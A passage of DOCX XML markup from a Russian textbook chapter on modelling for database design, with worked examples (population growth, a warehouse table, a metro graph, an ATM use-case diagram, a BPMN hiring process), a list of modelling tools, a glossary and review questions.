      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Расчёт:</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="NoSpacing"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>P(10) = 100 000 × e^(0.02 × 10)</w:t>
        <w:br/>
        <w:t>P(10) = 100 000 × e^0.2</w:t>
        <w:br/>
        <w:t>P(10) = 100 000 × 1.2214</w:t>
        <w:br/>
        <w:t>P(10) ≈ 122 140 человек</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Вывод:</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> Через 10 лет население вырастет до примерно 122 тысяч человек (прирост 22%).</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Реальность:</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> Эта модель игнорирует кучу факторов (миграцию, экономику, эпидемии). В реальности может быть и 110 тысяч, и 130 тысяч. Но модель даёт </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>примерную оценку</w:t>
      </w:r>
      <w:r>
        <w:t>.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>---</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>Пример 7: Табличная модель учёта товаров на складе</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Задача:</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> Учёт товаров на складе интернет-магазина.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Таблица:</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>| ID  | Название       | Категория | Цена  | Количество | Поставщик       |</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>| --- | -------------- | --------- | ----- | ---------- | --------------- |</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>| 1   | Молоко 1л      | Продукты  | 80 ₽  | 50         | ООО "Молокозавод" |</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>| 2   | Хлеб белый     | Продукты  | 40 ₽  | 100        | ИП Иванов       |</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>| 3   | Колбаса        | Продукты  | 350 ₽ | 20         | ООО "Мясокомбинат" |</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>| 4   | Телефон X      | Электроника | 30000 ₽ | 5       | Apple Inc.      |</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Модель позволяет:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Посчитать стоимость товаров на складе:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">  `(80×50) + (40×100) + (350×20) + (30000×5) = 4000 + 4000 + 7000 + 150000 = 165 000 ₽`</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Определить, какие товары заканчиваются (количество &lt; 10)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Найти все товары определённого поставщика</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Плюсы:</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> Просто, компактно, легко обрабатывать (SQL-запросы).  </w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Минусы:</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> Не показывает связи между объектами (например, история заказов).</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>---</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>Пример 8: Граф-схема метро (графическая модель)</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Задача:</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> Показать связи между станциями метро.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Модель:</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> Граф (узлы = станции, рёбра = перегоны).</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="NoSpacing"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>Пример (фрагмент метро Москвы, Сокольническая линия):</w:t>
        <w:br/>
        <w:br/>
        <w:t>[Библиотека им. Ленина] ←→ [Кропоткинская] ←→ [Парк Культуры]</w:t>
        <w:br/>
        <w:t xml:space="preserve">         ↕</w:t>
        <w:br/>
        <w:t>[Охотный Ряд]</w:t>
        <w:br/>
        <w:t xml:space="preserve">         ↕</w:t>
        <w:br/>
        <w:t>[Лубянка]</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Модель позволяет:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Найти кратчайший путь между станциями (алгоритм поиска пути в графе)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Определить, есть ли прямое сообщение</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Найти все пересадки</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Реальность vs модель:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>На схеме метро линии выглядят прямыми, хотя реальные тоннели извиваются.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Расстояния на схеме не соответствуют реальным (для наглядности).</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Это нормально:</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> модель показывает </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>топологию</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> (кто с кем связан), а не геометрию.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>---</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>Пример 9: UML Use Case диаграмма для банкомата</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Задача:</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> Определить функции банкомата.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Актёры:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**Клиент** (человек с банковской картой)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**Банковская система** (backend, проверяет баланс, списывает деньги)</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Варианты использования (use cases):</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>**Авторизация** (вставить карту, ввести PIN-код)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>**Проверить баланс** (запрос к банковской системе)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>**Снять наличные** (выбор суммы, проверка баланса, выдача денег)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>**Пополнить счёт** (внести купюры, зачисление на счёт)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>**Перевести деньги** (ввод номера карты получателя, сумма)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>**Напечатать чек** (печать квитанции)</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Связи:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Клиент → Авторизация (обязательно перед любой операцией)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Клиент → Проверить баланс</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Клиент → Снять наличные → (include) Проверить баланс (сначала проверка, потом выдача)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Клиент → Пополнить счёт</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Банковская система → Авторизовать клиента (проверка PIN-кода)</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Модель помогает:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Понять, что должен уметь банкомат</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Разделить функции между клиентом и банковской системой</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Определить последовательность действий</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>---</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>Пример 10: BPMN-диаграмма "Процесс найма сотрудника"</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Задача:</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> Смоделировать процесс найма нового сотрудника в компанию.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Процесс:</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="NoSpacing"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>[Начало: Появилась вакансия]</w:t>
        <w:br/>
        <w:t xml:space="preserve">   ↓</w:t>
        <w:br/>
        <w:t>[Задача: Публикация вакансии на hh.ru]</w:t>
        <w:br/>
        <w:t xml:space="preserve">   ↓</w:t>
        <w:br/>
        <w:t>[Задача: Сбор резюме]</w:t>
        <w:br/>
        <w:t xml:space="preserve">   ↓</w:t>
        <w:br/>
        <w:t>&lt;Шлюз: Есть подходящие кандидаты?&gt;</w:t>
        <w:br/>
        <w:t xml:space="preserve">   Нет → [Задача: Расширить поиск] → (переход обратно к "Публикация вакансии")</w:t>
        <w:br/>
        <w:t xml:space="preserve">   Да ↓</w:t>
        <w:br/>
        <w:t>[Задача: Приглашение кандидатов на собеседование]</w:t>
        <w:br/>
        <w:t xml:space="preserve">   ↓</w:t>
        <w:br/>
        <w:t>[Задача: Проведение собеседования]</w:t>
        <w:br/>
        <w:t xml:space="preserve">   ↓</w:t>
        <w:br/>
        <w:t>&lt;Шлюз: Кандидат подходит?&gt;</w:t>
        <w:br/>
        <w:t xml:space="preserve">   Нет → [Задача: Отказ кандидату] → (переход к "Есть ещё кандидаты?")</w:t>
        <w:br/>
        <w:t xml:space="preserve">   Да ↓</w:t>
        <w:br/>
        <w:t>[Задача: Оформление трудового договора]</w:t>
        <w:br/>
        <w:t xml:space="preserve">   ↓</w:t>
        <w:br/>
        <w:t>[Задача: Онбординг (ввод в должность)]</w:t>
        <w:br/>
        <w:t xml:space="preserve">   ↓</w:t>
        <w:br/>
        <w:t>[Конец: Сотрудник принят]</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Модель позволяет:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Увидеть все этапы процесса</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Определить узкие места (например, долго ждут отклика от кандидатов)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Стандартизировать процесс (каждый новый HR следует диаграмме)</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>---</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:r>
        <w:t>4.2.7. Связь моделирования с жизненным циклом БД</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">Моделирование — это </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>первый этап</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> любого проекта, включая разработку БД (вспоминаем главу 4.1).</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Фаза "Анализ требований"</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> (глава 4.1) = моделирование предметной области:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Создаём **вербальную модель** (ТЗ: "Нужна БД для интернет-магазина")</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Рисуем **Use Case диаграмму** (какие функции нужны)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Строим **табличную модель** (какие сущности и атрибуты)</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Фаза "Проектирование"</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> (глава 4.1) = создание информационной модели БД:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Рисуем **ER-диаграмму** (Entity-Relationship, про это в главе 7.1)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Создаём **схему таблиц** (логическая модель)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Определяем **связи между таблицами** (один-ко-многим, многие-ко-многим)</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>Без моделирования начинаешь писать код сразу — и через неделю понимаешь, что забыл про половину требований и надо всё переделывать.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>---</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:r>
        <w:t>4.2.8. Инструменты моделирования</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>Для создания моделей используют различные инструменты.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>Для блок-схем и диаграмм:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**draw.io (diagrams.net)** — бесплатный онлайн-редактор (поддерживает UML, BPMN, блок-схемы)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**Lucidchart** — платный, но мощный</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**Microsoft Visio** — классика, но платный</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**yEd** — бесплатный десктопный редактор графов</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>Для UML:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**PlantUML** — текстовое описание диаграмм (пишешь код, получаешь картинку)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**Enterprise Architect** — профессиональный инструмент (дорогой)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**StarUML** — бесплатный аналог Enterprise Architect</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>Для BPMN:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**Bizagi Modeler** — бесплатный редактор BPMN</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**Camunda Modeler** — open-source, для BPM-систем</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>Для математических моделей:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**Python (NumPy, SciPy, Matplotlib)** — для численного моделирования</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**MATLAB/Octave** — классика для инженеров</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**Excel** — для простых моделей (таблицы, графики)</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>---</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:r>
        <w:t>Термины и определения</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Модель</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> — упрощённое представление реального объекта, процесса или системы.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Моделирование</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> — процесс создания модели.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Материальная модель</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> — физический объект, воспроизводящий свойства оригинала.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Информационная модель</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> — абстрактное описание системы (текст, схема, формула, таблица).</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Вербальная модель</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> — описание текстом на естественном языке.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Графическая модель</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> — представление в виде схем, диаграмм, графиков.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Табличная модель</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> — представление данных в виде таблицы.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Математическая модель</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> — описание системы через формулы и уравнения.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Блок-схема (flowchart)</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> — графическое представление алгоритма с помощью блоков и стрелок.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>UML (Unified Modeling Language)</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> — язык моделирования для визуализации программных систем.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Use Case Diagram</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> — диаграмма вариантов использования (кто что делает в системе).</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Activity Diagram</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> — диаграмма активности (последовательность действий).</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>BPMN (Business Process Model and Notation)</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> — стандарт моделирования бизнес-процессов.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>State Diagram</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> — диаграмма состояний (в каких состояниях может находиться объект).</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Процесс</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> — последовательность действий, преобразующих входные данные в выходные.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Адекватность модели</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> — соответствие модели реальности.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>---</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:r>
        <w:t>Контрольные вопросы</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>Теоретические:</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>**Что такое модель и зачем она нужна?**</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">   _Подсказка: упрощение, прогнозирование, оптимизация._</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>**Чем отличаются материальные и информационные модели? Приведите примеры.**</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">   _Подсказка: материальные = физические объекты, информационные = данные._</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>**Назовите 5 типов информационных моделей по способу представления.**</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">   _Подсказка: вербальные, графические, табличные, математические, структурные._</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>**Что показывает блок-схема? Из каких элементов она состоит?**</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">   _Подсказка: алгоритм, последовательность действий; элементы: овал, прямоугольник, ромб._</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>**Что такое UML? Для чего используется Use Case Diagram?**</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">   _Подсказка: язык моделирования; Use Case = кто и что делает в системе._</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>**Перечислите этапы моделирования.**</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">   _Подсказка: постановка задачи, разработка модели, проверка, анализ, корректировка._</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>Практические:</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
